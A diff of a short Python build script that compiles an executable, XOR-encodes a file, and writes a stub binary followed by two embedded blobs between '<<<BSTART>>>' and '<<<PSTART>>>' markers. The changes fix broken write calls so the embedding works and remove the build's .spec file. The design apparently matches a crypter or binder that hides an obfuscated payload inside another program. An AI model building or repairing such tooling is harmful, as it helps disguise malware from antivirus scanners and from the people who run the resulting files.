@@ -1,4 +1,5 @@
 import subprocess
+import os
 import shutil
 
 def build_exe(filename):
@@ -6,7 +7,8 @@ def build_exe(filename):
     shutil.move(f"dist/{filename}.exe", f"{filename}.exe")
     shutil.rmtree("dist", ignore_errors=True)
     shutil.rmtree("build", ignore_errors=True)
-
+    os.remove(f"{filename}.spec")
+    
 def xor(filename, key = 12):
     with open(filename, 'rb') as f: 
         data = f.read()
@@ -25,12 +27,12 @@ def combine():
         p_data = f.read()
     with open(output_path, 'wb') as f: 
         f.write(stub_data)
-        f.writable(b"<<<BSTART>>>")
-        f.writable(b_data)
-        f.writable(b"<<<BEND>>>")
-        f.writable(b"<<<PSTART>>>")
+        f.write(b"<<<BSTART>>>")
+        f.write(b_data)
+        f.write(b"<<<BEND>>>")
+        f.write(b"<<<PSTART>>>")
         f.write(p_data)
-        f.writable(b"<<<PEND>>>")
+        f.write(b"<<<PEND>>>")
 
 
 if __name__ == "__main__":
